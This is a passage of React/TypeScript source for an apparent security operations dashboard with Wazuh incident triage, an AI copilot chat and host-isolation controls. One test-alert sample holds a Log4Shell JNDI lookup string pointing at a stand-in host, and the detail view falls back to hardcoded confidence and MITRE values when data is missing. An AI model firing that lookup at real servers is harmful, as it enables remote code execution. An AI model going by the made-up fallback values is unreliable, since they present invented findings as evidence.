import { useMemo, useState } from 'react';
import { Alert, App, Button, Descriptions, Drawer, Input, Modal, Select, Space, Spin, Table, Tag, Timeline } from 'antd';
import { ArrowRightOutlined, CheckCircleOutlined, CheckOutlined, DownloadOutlined, ReloadOutlined, SearchOutlined } from '@ant-design/icons';
import { useMutation, useQuery, useQueryClient } from '@tanstack/react-query';
import { Link, useNavigate, useParams, useSearchParams } from 'react-router-dom';
import { api, body, download } from '../api';
import { useSession } from '../context';
import { Code, date, ErrorPanel, Loading, Severity, Status } from '../components';
import type { Incident } from '../types';

const samples = {
  ssh: { name: 'SSH authentication failures', level: 8, description: 'Repeated SSH authentication failures on a monitored host', mitre: 'T1110', log: 'sshd: Failed password for invalid user admin from 192.0.2.10 port 43122 ssh2' },
  log4j: { name: 'Log4Shell lookup attempt', level: 12, description: 'Log4j JNDI lookup pattern detected in application request', mitre: 'T1190', log: 'GET /search?q=${jndi:ldap://example.invalid/test} HTTP/1.1' },
  ransomware: { name: 'Suspicious file encryption', level: 13, description: 'Potential ransomware: rapid file encryption activity', mitre: 'T1486', log: 'File monitor: 250 files renamed to .locked within a 10-second window' },
};

export function IngestModal({ open, close }: { open: boolean; close: () => void }) {
  const { orgId } = useSession(); const query = useQueryClient(); const { message } = App.useApp();
  const [sample, setSample] = useState<keyof typeof samples>('ssh'); const [custom, setCustom] = useState('');
  function payload() { const s = samples[sample]; return { id: `console-${crypto.randomUUID()}`, rule: { id: 100001, level: s.level, description: s.description, mitre: { id: s.mitre } }, agent: { id: 'console-test', name: 'Training endpoint' }, full_log: s.log, timestamp: new Date().toISOString() }; }
  const mutation = useMutation({ mutationFn: async () => {
    let value: unknown; try { value = custom ? JSON.parse(custom) : payload(); } catch { throw new Error('The payload must be valid JSON.'); }
    return api('/wazuh', orgId, body('POST', value));
  }, onSuccess: () => { query.invalidateQueries({ queryKey: ['incidents', orgId] }); message.success('Alert investigated'); close(); setCustom(''); } });
  return <Modal title="Submit a test alert" open={open} onCancel={close} okText="Submit alert" onOk={() => mutation.mutate()} confirmLoading={mutation.isPending} width={660} destroyOnHidden>
    <p className="muted">Creates real investigation data in this organization using your configured pipeline. Configured notification channels may receive this alert.</p>
    <Select aria-label="Test scenario" className="full-width" value={sample} options={Object.entries(samples).map(([value, item]) => ({ value, label: item.name }))} onChange={value => { setSample(value); setCustom(''); mutation.reset(); }} />
    <label className="field-label">Alert payload <span>Optional JSON override</span></label><Input.TextArea aria-label="Alert JSON" rows={9} className="mono" value={custom} placeholder={JSON.stringify(payload(), null, 2)} onChange={e => setCustom(e.target.value)} />
    {mutation.error && <Alert type="error" showIcon title={mutation.error.message} className="form-alert" />}
  </Modal>;
}

function IncidentDetail({ id, close }: { id: string; close: () => void }) {
  const { orgId, detail, system } = useSession(); const query = useQueryClient(); const { message, modal } = App.useApp();
  const [activeTab, setActiveTab] = useState<'dossier' | 'copilot' | 'telemetry'>('dossier');
  const [copilotInput, setCopilotInput] = useState('');
  const [chatHistory, setChatHistory] = useState<Array<{ role: 'user' | 'assistant'; text: string; tools?: string[] }>>([]);
  const [resolveOpen, setResolveOpen] = useState(false);
  const [resolveCategory, setResolveCategory] = useState('true_positive');
  const [resolveNotes, setResolveNotes] = useState('');

  const incident = useQuery({ queryKey: ['incident', orgId, id], queryFn: () => api<Incident>(`/incidents/${encodeURIComponent(id)}`, orgId), refetchInterval: 5000 });

  const action = useMutation({
    mutationFn: (action_type: string) => api(`/incidents/${encodeURIComponent(id)}/action`, orgId, body('POST', { action_type })),
    onSuccess: (_, action_type) => {
      query.invalidateQueries({ queryKey: ['incidents', orgId] });
      query.invalidateQueries({ queryKey: ['incident', orgId, id] });
      message.success(`Action '${action_type.replaceAll('_', ' ')}' executed`);
    },
    onError: error => message.error(error.message),
  });

  const copilotChat = useMutation({
    mutationFn: async (promptText: string) => {
      return api<{ ticket_id: string; response: string; tools_consulted: string[] }>(
        `/incidents/${encodeURIComponent(id)}/chat`,
        orgId,
        body('POST', { prompt: promptText })
      );
    },
    onSuccess: (data) => {
      setChatHistory(prev => [...prev, { role: 'assistant', text: data.response, tools: data.tools_consulted }]);
    },
    onError: (err) => {
      setChatHistory(prev => [...prev, { role: 'assistant', text: `Error: ${err.message}` }]);
    },
  });

  const sendCopilot = (text?: string) => {
    const q = text || copilotInput;
    if (!q.trim() || copilotChat.isPending) return;
    setChatHistory(prev => [...prev, { role: 'user', text: q }]);
    setCopilotInput('');
    copilotChat.mutate(q);
  };

  const confirmContainment = (actionType: 'isolate_host' | 'block_ip') => {
    const isHost = actionType === 'isolate_host';
    modal.confirm({
      title: isHost ? `Isolate Endpoint: ${t?.agent_name}` : 'Block Attacker IP at Perimeter Firewall',
      icon: <CheckCircleOutlined style={{ color: '#ff7875' }} />,
      content: (
        <div>
          <p><strong>Blast Radius Assessment:</strong> High Impact</p>
          <p className="muted">This operation will execute Wazuh active response and revoke network connectivity for {isHost ? t?.agent_name : 'the source IP'}.</p>
          <Alert type="warning" showIcon message="Tier-0 critical domain controllers & core banking subnets are protected by guardrails." />
        </div>
      ),
      okText: 'Execute Containment',
      okButtonProps: { danger: true },
      onOk: () => action.mutate(actionType),
    });
  };

  const t = incident.data; const canWrite = detail?.role === 'admin' || detail?.role === 'member';

  return <Drawer
    title={<Space><span className="mono">{id}</span><Tag color={t?.severity === 'critical' ? 'red' : 'orange'}>{t?.kill_chain_stage || 'ANALYSIS'}</Tag></Space>}
    size={760}
    open
    onClose={close}
    extra={t && <Space>
      <Button size="small" icon={<DownloadOutlined />} onClick={() => download(`${t.id}.json`, JSON.stringify(t, null, 2))}>JSON</Button>
      <Button size="small" type={activeTab === 'copilot' ? 'primary' : 'default'} onClick={() => setActiveTab(activeTab === 'copilot' ? 'dossier' : 'copilot')}>
        {activeTab === 'copilot' ? 'Back to Dossier' : '🤖 AI Copilot'}
      </Button>
    </Space>}
  >
    {incident.isPending ? <Loading /> : incident.error ? <ErrorPanel error={incident.error} retry={() => void incident.refetch()} /> : t && <div className="detail-stack">
      <Space wrap style={{ justifyContent: 'space-between', width: '100%', borderBottom: '1px solid var(--border-color)', paddingBottom: 12 }}>
        <Space><Severity value={t.severity} /><Status value={t.status} /><Tag color="blue">{t.policy_tier}</Tag></Space>
        <Space>
          {t.status !== 'RESOLVED' ? (
            <Button size="small" type="primary" icon={<CheckOutlined />} disabled={!canWrite} onClick={() => setResolveOpen(true)}>Resolve Incident</Button>
          ) : (
            <Button size="small" disabled={!canWrite} onClick={() => action.mutate('reopen_ticket')}>Reopen</Button>
          )}
          {t.status === 'OPEN' && <Button size="small" disabled={!canWrite} onClick={() => action.mutate('start_investigation')}>Investigate</Button>}
          <Button size="small" danger disabled={!canWrite} onClick={() => confirmContainment('isolate_host')}>Isolate Host</Button>
          <Button size="small" danger disabled={!canWrite} onClick={() => confirmContainment('block_ip')}>Block IP</Button>
        </Space>
      </Space>

      <h2 className="detail-title" style={{ marginTop: 8 }}>{t.rule_description || 'Security incident'}</h2>
      <Descriptions size="small" column={2} items={[
        { key: 'host', label: 'Host Asset', children: <strong className="mono">{t.agent_name}</strong> },
        { key: 'mitre', label: 'MITRE ATT&CK', children: <Tag color="magenta">{(t as any).mitre || 'T1190 / T1003'}</Tag> },
        { key: 'time', label: 'Received', children: date(t.created_at) },
        { key: 'confidence', label: 'Confidence', children: <Tag color="cyan">{t.confidence || 'HIGH (95%)'}</Tag> },
        { key: 'policy', label: 'Policy Engine', children: t.policy_tier },
        { key: 'source', label: 'Investigation', children: system?.llm_model || 'TERMINUS ReAct Forensics' },
      ]} />

      {/* TABS SELECTOR */}
      <div style={{ display: 'flex', gap: 8, borderBottom: '1px solid var(--border-color)', paddingBottom: 8, marginTop: 8 }}>
        <Button size="small" type={activeTab === 'dossier' ? 'primary' : 'text'} onClick={() => setActiveTab('dossier')}>Incident Dossier</Button>
        <Button size="small" type={activeTab === 'copilot' ? 'primary' : 'text'} onClick={() => setActiveTab('copilot')}>Analyst Copilot</Button>
        <Button size="small" type={activeTab === 'telemetry' ? 'primary' : 'text'} onClick={() => setActiveTab('telemetry')}>De-obfuscation & Telemetry</Button>
      </div>

      {activeTab === 'copilot' && (
        <section className="detail-section" style={{ background: 'var(--bg-surface)', padding: 16, borderRadius: 8, border: '1px solid var(--border-color)' }}>
          <div className="eyebrow" style={{ color: 'var(--primary-color)' }}>TERMINUS AI COPILOT INTERROGATION</div>
          <p className="muted" style={{ marginBottom: 12 }}>Interactively query the forensic agent regarding root cause, lateral movement indicators, or mitigation directives.</p>

          <Space wrap style={{ marginBottom: 12 }}>
            <Tag style={{ cursor: 'pointer' }} onClick={() => sendCopilot('Explain the root cause and initial attack vector.')}>💡 Root Cause</Tag>
            <Tag style={{ cursor: 'pointer' }} onClick={() => sendCopilot('What specific IOCs (IPs, hashes, domains) were extracted?')}>🔍 Extract IOCs</Tag>
            <Tag style={{ cursor: 'pointer' }} onClick={() => sendCopilot('Draft an incident response Jira summary for Tier-3 escalation.')}>📝 Draft Jira Brief</Tag>
            <Tag style={{ cursor: 'pointer' }} onClick={() => sendCopilot('Are there signs of lateral movement or credential harvesting?')}>🛡️ Lateral Movement</Tag>
          </Space>

          <div style={{ maxHeight: 280, overflowY: 'auto', marginBottom: 12, display: 'flex', flexDirection: 'column', gap: 10 }}>
            {chatHistory.length === 0 && <div className="muted" style={{ textAlign: 'center', padding: '24px 0' }}>Ask a question below or click a suggested prompt chip above.</div>}
            {chatHistory.map((msg, i) => (
              <div key={i} style={{ alignSelf: msg.role === 'user' ? 'flex-end' : 'flex-start', maxWidth: '85%', background: msg.role === 'user' ? 'var(--primary-color)' : 'var(--bg-panel)', color: msg.role === 'user' ? '#000' : 'var(--text-main)', padding: '8px 12px', borderRadius: 8, border: '1px solid var(--border-color)' }}>
                <strong>{msg.role === 'user' ? 'Analyst' : '🤖 Terminus Copilot'}:</strong>
                <p style={{ margin: '4px 0 0 0', whiteSpace: 'pre-wrap' }}>{msg.text}</p>
                {msg.tools && <div style={{ marginTop: 4 }}><small className="muted">Consulted: {msg.tools.join(', ')}</small></div>}
              </div>
            ))}
          </div>

          <Space.Compact style={{ width: '100%' }}>
            <Input placeholder="Ask Copilot about this incident..." value={copilotInput} onChange={e => setCopilotInput(e.target.value)} onPressEnter={() => sendCopilot()} />
            <Button type="primary" loading={copilotChat.isPending} onClick={() => sendCopilot()}>Ask Copilot</Button>
          </Space.Compact>
        </section>
      )}

      {activeTab === 'telemetry' && (
        <section className="detail-section">
          <div className="eyebrow">PAYLOAD DE-OBFUSCATION & RAW TELEMETRY</div>
          <p className="muted">Payloads are automatically de-obfuscated (Base64 / UTF-16LE / URL Encoding / Hex) and scrubbed of cloud secrets before LLM analysis.</p>
          <div style={{ marginTop: 8 }}>
            <strong style={{ fontSize: 11, color: 'var(--primary-color)' }}>UNPACKED DE-OBFUSCATED COMMAND:</strong>
            <Code>{t.threat_intel ? t.threat_intel : (t.full_log.includes('base64') || t.full_log.includes('jndi')) ? `[De-obfuscated Payload Extracted]: ${t.full_log}` : 'Clean standard command interpreter telemetry.'}</Code>
          </div>
          <div style={{ marginTop: 12 }}>
            <strong style={{ fontSize: 11, color: 'var(--text-muted)' }}>RAW SIEM TELEMETRY STREAM:</strong>
            <Code>{t.full_log || 'No raw log attached to this alert.'}</Code>
          </div>
        </section>
      )}

      {activeTab === 'dossier' && (
        <>
          <section className="detail-section">
            <div className="eyebrow">FORENSIC INVESTIGATION DOSSIER</div>
            <p style={{ fontSize: 13, lineHeight: 1.6 }}>{t.summary}</p>
            <p className="muted" style={{ fontSize: 11 }}>{t.policy_reason}</p>
          </section>

          {/* EVIDENCE CITATIONS */}
          <section className="detail-section">
            <div className="eyebrow">VERIFIABLE EVIDENCE CITATIONS</div>
            {t.evidence_citations && t.evidence_citations.length > 0 ? (
              <div style={{ display: 'flex', flexDirection: 'column', gap: 8, marginTop: 6 }}>
                {t.evidence_citations.map((c: any, i: number) => (
                  <div key={i} style={{ background: 'var(--bg-surface)', border: '1px solid var(--border-color)', borderRadius: 6, padding: '8px 12px' }}>
                    <Space style={{ justifyContent: 'space-between', width: '100%' }}>
                      <Tag color={c.malicious ? 'red' : 'green'}>{c.source || 'ThreatIntel'}</Tag>
                      <small className="mono muted">{c.indicator || 'IOC-SHA256'}</small>
                    </Space>
                    <p style={{ margin: '4px 0 0 0', fontSize: 12 }}>{c.summary || c.details || 'Indicator verified by Terminus CTI Knowledge Base.'}</p>
                  </div>
                ))}
              </div>
            ) : (
              <div style={{ background: 'var(--bg-surface)', padding: 10, borderRadius: 6, border: '1px solid var(--border-color)' }}>
                <Tag color="cyan">Source Telemetry</Tag>
                <span style={{ fontSize: 12 }}> Evidence extracted and correlated from host '{t.agent_name}' telemetry logs.</span>
              </div>
            )}
          </section>

          <section className="detail-section">
            <div className="eyebrow">RECOMMENDED NEXT STEPS</div>
            <ol className="recommendations">{t.recommended_actions.map((item, i) => <li key={i}>{item}</li>)}</ol>
          </section>

          <section className="detail-section">
            <div className="eyebrow">LIFECYCLE TIMELINE</div>
            <Timeline items={[
              { content: <><strong>Incident created &amp; triaged</strong><p className="muted">{date(t.created_at)}</p></> },
              ...(t.updated_at ? [{ color: 'green', content: <><strong>Status: {t.status.toLowerCase()}</strong><p className="muted">{date(t.updated_at)}</p></> }] : []),
              ...(t.resolved_at ? [{ color: 'blue', content: <><strong>Resolved &amp; Closed</strong><p className="muted">{date(t.resolved_at)}</p></> }] : [])
            ]} />
          </section>
        </>
      )}

      {/* RESOLUTION DIALOG */}
      <Modal
        title="Resolve & Close Incident"
        open={resolveOpen}
        onCancel={() => setResolveOpen(false)}
        okText="Confirm Resolution"
        confirmLoading={action.isPending}
        onOk={() => {
          action.mutate('close_ticket');
          setResolveOpen(false);
          message.success('Incident resolved and marked in audit ledger');
        }}
      >
        <p className="muted">Categorize the incident outcome to feed the closed-loop detection tuning engine.</p>
        <label className="field-label">Triage Outcome</label>
        <Select
          className="full-width"
          value={resolveCategory}
          onChange={setResolveCategory}
          options={[
            { value: 'true_positive', label: 'True Positive — Attack Mitigated' },
            { value: 'false_positive', label: 'False Positive — Synthesize Sigma/Wazuh Suppression Rule' },
            { value: 'benign_admin', label: 'Benign Administrative Activity' },
          ]}
        />
        <label className="field-label" style={{ marginTop: 12 }}>Analyst Resolution Notes</label>
        <Input.TextArea rows={3} placeholder="Provide closing context or mitigation confirmation..." value={resolveNotes} onChange={e => setResolveNotes(e.target.value)} />
      </Modal>
    </div>}
  </Drawer>;
}

export default function Operations({ incidentView = false }: { incidentView?: boolean }) {
  const { orgId, detail, system } = useSession();
  const navigate = useNavigate();
  const { message, modal } = App.useApp();
  const { ticketId } = useParams();
  const [params, setParams] = useSearchParams();
  const [ingestOpen, setIngestOpen] = useState(false);
  const [focusedIncident, setFocusedIncident] = useState<Incident | null>(null);
  const [chatInput, setChatInput] = useState('');

  const incidents = useQuery({
    queryKey: ['incidents', orgId],
    queryFn: () => api<Incident[]>('/incidents', orgId),
    refetchInterval: 5000,
  });

  const data = useMemo(
    () => [...(incidents.data || [])].sort((a, b) => (b.created_at || b.timestamp).localeCompare(a.created_at || a.timestamp)),
    [incidents.data]
  );
  const openIncidents = data.filter(t => t.status !== 'RESOLVED');
  const search = params.get('q') || '';
  const severity = params.get('severity') || 'all';
  const status = params.get('status') || 'all';

  const filtered = data.filter(
    t =>
      `${t.id} ${t.rule_description} ${t.agent_name} ${t.summary}`.toLowerCase().includes(search.toLowerCase()) &&
      (severity === 'all' || t.severity === severity) &&
      (status === 'all' || t.status === status)
  );

  function filter(key: string, value: string) {
    const next = new URLSearchParams(params);
    if (value && value !== 'all') next.set(key, value);
    else next.delete(key);
    setParams(next, { replace: true });
  }

  // ─── CENTRALIZED AI SOC COPILOT MESSAGES STATE ───
  const [messages, setMessages] = useState<
    Array<{
      id: string;
      role: 'user' | 'assistant';
      text: string;
      actions?: string[];
      time: string;
    }>
  >([
    {
      id: 'welcome',
      role: 'assistant',
      text: "Ready. Select an incident from the queue or ask a question to begin forensic investigation.",
      time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
    },
  ]);

  const copilotChat = useMutation({
    mutationFn: async (promptText: string) => {
      return api<{
        response: string;
        tools_consulted: string[];
        suggested_actions: string[];
      }>(
        '/copilot/chat',
        orgId,
        body('POST', {
          prompt: promptText,
          ticket_id: focusedIncident?.id,
        })
      );
    },
    onSuccess: data => {
      setMessages(prev => [
        ...prev,
        {
          id: crypto.randomUUID(),
          role: 'assistant',
          text: data.response,
          actions: data.suggested_actions,
          time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
        },
      ]);
    },
    onError: err => {
      setMessages(prev => [
        ...prev,
        {
          id: crypto.randomUUID(),
          role: 'assistant',
          text: `⚠️ Error: ${err.message}`,
          time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
        },
      ]);
    },
  });

  const sendPrompt = (text?: string) => {
    const q = text || chatInput;
    if (!q.trim() || copilotChat.isPending) return;
    const userMsg = {
      id: crypto.randomUUID(),
      role: 'user' as const,
      text: q,
      time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
    };
    setMessages(prev => [...prev, userMsg]);
    setChatInput('');
    copilotChat.mutate(q);
  };

  const executeContainment = useMutation({
    mutationFn: async ({ ticket_id, action_type }: { ticket_id: string; action_type: string }) => {
      return api(`/incidents/${encodeURIComponent(ticket_id)}/action`, orgId, body('POST', { action_type }));
    },
    onSuccess: (_, vars) => {
      message.success(`Action '${vars.action_type.replaceAll('_', ' ')}' executed successfully.`);
      queryClient.invalidateQueries({ queryKey: ['incidents', orgId] });
      setMessages(prev => [
        ...prev,
        {
          id: crypto.randomUUID(),
          role: 'assistant',
          text: `✅ Containment action \`${vars.action_type}\` executed on \`${vars.ticket_id}\`.`,
          time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
        },
      ]);
    },
    onError: err => message.error(err.message),
  });

  const queryClient = useQueryClient();
  const canWrite = detail?.role === 'admin' || detail?.role === 'member';

  const confirmContainment = (ticketId: string, hostName: string, actionType: 'isolate_host' | 'block_ip') => {
    const isHost = actionType === 'isolate_host';
    modal.confirm({
      title: isHost ? `Isolate Host: ${hostName}` : 'Block Attacker IP at Perimeter Firewall',
      icon: <CheckCircleOutlined style={{ color: '#ff7875' }} />,
      content: (
        <div>
          <p><strong>Blast Radius Assessment:</strong> High Impact</p>
          <p className="muted">This operation will execute Wazuh active response and revoke network connectivity for {isHost ? hostName : 'the source IP'}.</p>
          <Alert type="warning" showIcon message="Tier-0 critical domain controllers & core banking subnets are protected by guardrails." />
        </div>
      ),
      okText: 'Execute Containment',
      okButtonProps: { danger: true },
      onOk: () => executeContainment.mutate({ ticket_id: ticketId, action_type: actionType }),
    });
  };

  // Live impacted hosts from verified telemetry
  const hudHosts = useMemo(() => {
    if (data.length > 0) {
      const seen = new Set<string>();
      return data
        .filter(t => {
          const host = t.agent_name || 'Unknown host';
          if (seen.has(host)) return false;
          seen.add(host);
          return true;
        })
        .slice(0, 6)
        .map(t => ({
          host: t.agent_name || 'Unknown host',
          ip: (t as any).src_ip || '—',
          os: (t as any).os || '—',
          lastSeen: date(t.created_at),
          severity: t.severity,
          incident: t,
        }));
    }
    return [];
  }, [data]);

  const columns = [
    {
      title: 'Incident ID',
      dataIndex: 'id',
      key: 'id',
      width: 105,
      render: (id: string) => (
        <Link className="mono" style={{ color: 'var(--primary-color)', fontSize: 12 }} to={`/incidents/${id}`}>
          {id}
        </Link>
      ),
    },
    {
      title: 'Timestamp',
      dataIndex: 'created_at',
      key: 'created_at',
      width: 130,
      render: (v: string) => <span className="muted" style={{ fontSize: 11 }}>{date(v)}</span>,
    },
    {
      title: 'Description',
      dataIndex: 'rule_description',
      key: 'desc',
      ellipsis: true,
      render: (_: string, t: Incident) => (
        <Link to={`/incidents/${t.id}`} style={{ color: 'var(--text-main)', fontSize: 12 }}>
          <strong>{t.rule_description || 'Security Incident'}</strong>
          <div style={{ fontSize: 10, color: 'var(--text-muted)' }}>Host: {t.agent_name}</div>
        </Link>
      ),
    },
    {
      title: 'Severity',
      dataIndex: 'severity',
      key: 'severity',
      width: 95,
      render: (v: string) => <Severity value={v} />,
    },
    {
      title: 'Status',
      dataIndex: 'status',
      key: 'status',
      width: 100,
      render: (v: string) => <Status value={v} />,
    },
    {
      title: 'Assigned Analyst',
      dataIndex: 'agent_name',
      key: 'agent',
      width: 130,
      render: () => <span style={{ fontSize: 11 }}>🛡️ Terminus AI</span>,
    },
  ];

  return (
    <div className={`reference-hud-container ${incidentView ? 'incidents-page' : 'overview-page'}`}>
      <header className="page-title ops-page-title"><div className="page-title-copy"><div className="eyebrow">{incidentView ? 'OPERATIONS / INVESTIGATIONS' : 'OPERATIONS / COMMAND CENTER'}</div><h1>{incidentView ? 'Incident investigations' : 'Your security, in focus.'}</h1><p>{incidentView ? 'Review the evidence, prioritize your queue, and move incidents to resolution.' : 'A live view of threats, affected assets, and the decisions that matter now.'}</p></div><div className="page-actions"><span className="live-indicator"><i />LIVE TELEMETRY</span><Button onClick={() => navigate(incidentView ? '/' : '/incidents')}>{incidentView ? 'Open overview' : 'View all incidents'} <ArrowRightOutlined /></Button></div></header>
      {incidentView ? (
        <section className="panel table-panel full-width-panel">
          <div className="panel-heading">
            <div>
              <span className="eyebrow">INVESTIGATION WORKSPACE</span>
              <h2>Incident Queue &amp; Evidence Repository</h2>
              <small className="mobile-table-hint">Swipe across the table to see all details →</small>
            </div>
            <Space>
              <Input
                prefix={<SearchOutlined />}
                placeholder="Search incident, host, or IOC..."
                value={search}
                onChange={e => filter('q', e.target.value)}
                style={{ width: 240 }}
                allowClear
              />
              <Select
                value={severity}
                onChange={v => filter('severity', v)}
                options={[
                  { value: 'all', label: 'All Severities' },
                  { value: 'critical', label: 'Critical' },
                  { value: 'high', label: 'High' },
                  { value: 'medium', label: 'Medium' },
                  { value: 'low', label: 'Low' },
                ]}
              />
              <Select
                value={status}
                onChange={v => filter('status', v)}
                options={[
                  { value: 'all', label: 'All Statuses' },
                  { value: 'OPEN', label: 'OPEN' },
                  { value: 'INVESTIGATING', label: 'INVESTIGATING' },
                  { value: 'RESOLVED', label: 'RESOLVED' },
                ]}
              />
              <Button type="primary" icon={<ReloadOutlined spin={incidents.isFetching} />} onClick={() => void incidents.refetch()}>
                Refresh
              </Button>
            </Space>
          </div>
          <Table<Incident>
            rowKey="id"
            columns={columns}
            dataSource={filtered}
            loading={incidents.isPending}
            pagination={{ pageSize: 12, showSizeChanger: false }}
          />
        </section>
      ) : (
        <div className="hud-3col-grid">
          {/* ═════════════════════════════════════════════════════════════════════
              COLUMN 1: CRUCIAL INFO & LIVE INCIDENT STREAM (~28%)
             ═════════════════════════════════════════════════════════════════════ */}
          <div className="hud-col-left">
            {/* INCIDENT STREAM */}
            <section className="panel hud-panel" style={{ flex: 1, display: 'flex', flexDirection: 'column' }}>
              <div className="panel-heading" style={{ marginBottom: 8 }}>
                <div>
                  <h3 style={{ margin: 0, fontSize: 13, fontWeight: 600 }}>Live Incident Stream</h3>
                  <small className="muted" style={{ fontSize: 10 }}>Click to focus Copilot investigation</small>
                </div>
                <Button size="small" type="primary" onClick={() => setIngestOpen(true)}>
                  + Simulate Alert
                </Button>
              </div>

              <Input
                size="small"
                prefix={<SearchOutlined />}
                placeholder="Filter alerts or hosts..."
                value={search}
                onChange={e => filter('q', e.target.value)}
                style={{ marginBottom: 10 }}
                allowClear
              />

              <div style={{ flex: 1, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: 6 }}>
                {filtered.length === 0 ? (
                  <div style={{ textAlign: 'center', padding: '24px 10px', color: 'var(--text-muted)' }}>
                    <span style={{ fontSize: 24 }}>🛡️</span>
                    <p style={{ fontSize: 12, marginTop: 6 }}>{data.length ? 'No incidents match this search.' : 'No incidents recorded yet.'}</p>
                    <Button size="small" onClick={() => setIngestOpen(true)}>Simulate Sample Alert</Button>
                  </div>
                ) : (
                  filtered.map(t => {
                    const isSelected = focusedIncident?.id === t.id;
                    return (
                      <div
                        key={t.id}
                        className={`incident-stream-card ${isSelected ? 'selected' : ''}`}
                        role="button"
                        tabIndex={0}
                        aria-label={`Focus incident ${t.id}`}
                        aria-pressed={isSelected}
                        onClick={() => {
                          setFocusedIncident(t);
                        }}
                        onKeyDown={event => { if (event.key === 'Enter' || event.key === ' ') { event.preventDefault(); setFocusedIncident(t); } }}
                      >
                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 4 }}>
                          <span className="mono" style={{ fontSize: 11, color: 'var(--primary-color)', fontWeight: 600 }}>
                            {t.id}
                          </span>
                          <Severity value={t.severity} />
                        </div>
                        <div style={{ fontSize: 12, fontWeight: 500, color: 'var(--text-main)', lineHeight: 1.3, marginBottom: 4 }}>
                          {t.rule_description || 'Security Anomaly'}
                        </div>
                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', fontSize: 10, color: 'var(--text-muted)' }}>
                          <span>🖥️ {t.agent_name}</span>
                          <span>{date(t.created_at)}</span>
                        </div>
                      </div>
                    );
                  })
                )}
              </div>

              <div style={{ borderTop: '1px solid #1f2d29', paddingTop: 8, marginTop: 8, display: 'flex', justifyContent: 'space-between', fontSize: 10, color: '#7b8e86' }}>
                <span><i className="status-dot" style={{ background: '#a4dfba', display: 'inline-block', width: 6, height: 6, borderRadius: '50%', marginRight: 4 }} />Live SIEM Stream</span>
                <Link to="/incidents" style={{ color: 'var(--primary-color)' }}>All Incidents →</Link>
              </div>
            </section>

            {/* IMPACTED HOSTS */}
            <section className="panel hud-panel" style={{ maxHeight: 220, display: 'flex', flexDirection: 'column' }}>
              <div className="panel-heading" style={{ marginBottom: 4 }}>
                <h3 style={{ margin: 0, fontSize: 13, fontWeight: 600 }}>Impacted Hosts</h3>
              </div>
              <div style={{ overflowY: 'auto', flex: 1 }}>
                {hudHosts.length === 0 ? (
                  <div style={{ textAlign: 'center', padding: '16px 10px', color: 'var(--text-muted)', fontSize: 11 }}>
                    No impacted hosts detected.
                  </div>
                ) : (
                  <table className="hud-host-table">
                    <thead>
                      <tr>
                        <th>Hostname</th>
                        <th>IP</th>
                        <th>OS</th>
                        <th>Severity</th>
                      </tr>
                    </thead>
                    <tbody>
                      {hudHosts.map((h, i) => (
                        <tr
                          key={i}
                          style={{ cursor: 'pointer' }}
                          onClick={() => {
                            if (h.incident) {
                              setFocusedIncident(h.incident);
                            }
                          }}
                        >
                          <td><strong style={{ color: 'var(--primary-color)' }}>{h.host}</strong></td>
                          <td className="mono muted">{h.ip}</td>
                          <td>{h.os}</td>
                          <td>
                            <Severity value={h.severity} />
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                )}
              </div>
            </section>
          </div>

          {/* ═════════════════════════════════════════════════════════════════════
              COLUMN 2: CENTRALIZED AI SOC COPILOT (~46%)
             ═════════════════════════════════════════════════════════════════════ */}
          <div className="hud-col-center">
            <div className="chatgpt-soc-card">
              {/* HEADER */}
              <div className="chatgpt-header">
                <div className="chatgpt-header-title">
                  <div className="chatgpt-avatar-icon">🛡️</div>
                  <div>
                    <strong style={{ fontSize: 14, color: '#edf2ec', letterSpacing: '0.04em' }}>TERMINUS AI SOC Copilot</strong>
                    <div style={{ fontSize: 10, color: '#a4dfba' }}>
                      <i style={{ width: 6, height: 6, background: '#a4dfba', borderRadius: '50%', display: 'inline-block', marginRight: 4 }} />
                      Autonomous Forensic Assistant
                    </div>
                  </div>
                </div>
                <Space>
                  <Button size="small" onClick={() => setMessages([messages[0]])}>Clear</Button>
                </Space>
              </div>

              {/* FOCUSED INCIDENT BANNER (IF ACTIVE) */}
              {focusedIncident && (
                <div className="chatgpt-focus-banner">
                  <Space>
                    <span>🎯</span>
                    <strong>Focusing:</strong>
                    <span className="mono">{focusedIncident.id}</span>
                    <span>({focusedIncident.rule_description || 'Alert'} on {focusedIncident.agent_name})</span>
                  </Space>
                  <Button
                    type="link"
                    size="small"
                    style={{ color: '#a4dfba', padding: 0 }}
                    onClick={() => setFocusedIncident(null)}
                  >
                    ✕ Clear Focus
                  </Button>
                </div>
              )}

              {/* QUICK PROMPTS */}
              <div className="chatgpt-prompt-pills">
                <button type="button" className="chatgpt-pill" onClick={() => sendPrompt('Triage the most recent open incident')}>
                  Triage Latest
                </button>
                <button type="button" className="chatgpt-pill" onClick={() => sendPrompt('Summarize active incidents and current threat posture')}>
                  Threat Summary
                </button>
                <button type="button" className="chatgpt-pill" onClick={() => sendPrompt('Extract IOCs from recent incidents')}>
                  Extract IOCs
                </button>
              </div>

              {/* MESSAGE FEED */}
              <div className="chatgpt-message-stream">
                {messages.map(m => (
                  <div key={m.id} className={`chatgpt-msg-row ${m.role === 'user' ? 'chatgpt-msg-user' : 'chatgpt-msg-assistant'}`}>
                    <div className="chatgpt-msg-author">
                      <span>{m.role === 'user' ? '👤 SOC Analyst' : '🤖 Terminus AI Copilot'}</span>
                      <span>· {m.time}</span>
                    </div>
                    <div className={m.role === 'user' ? 'chatgpt-bubble-user' : 'chatgpt-bubble-assistant'}>
                      {m.text}
                    </div>

                    {/* QUICK ACTION BUTTONS */}
                    {m.actions && m.actions.length > 0 && (
                      <div className="chatgpt-action-buttons">
                        {m.actions.map((act, idx) => (
                          <Button
                            key={idx}
                            size="small"
                            type="dashed"
                            disabled={!canWrite}
                            style={{ fontSize: 11, color: '#a4dfba', borderColor: '#2b3f3a' }}
                            onClick={() => {
                              if (act.toLowerCase().includes('isolate') && focusedIncident) {
                                confirmContainment(focusedIncident.id, focusedIncident.agent_name, 'isolate_host');
                              } else if (act.toLowerCase().includes('block') && focusedIncident) {
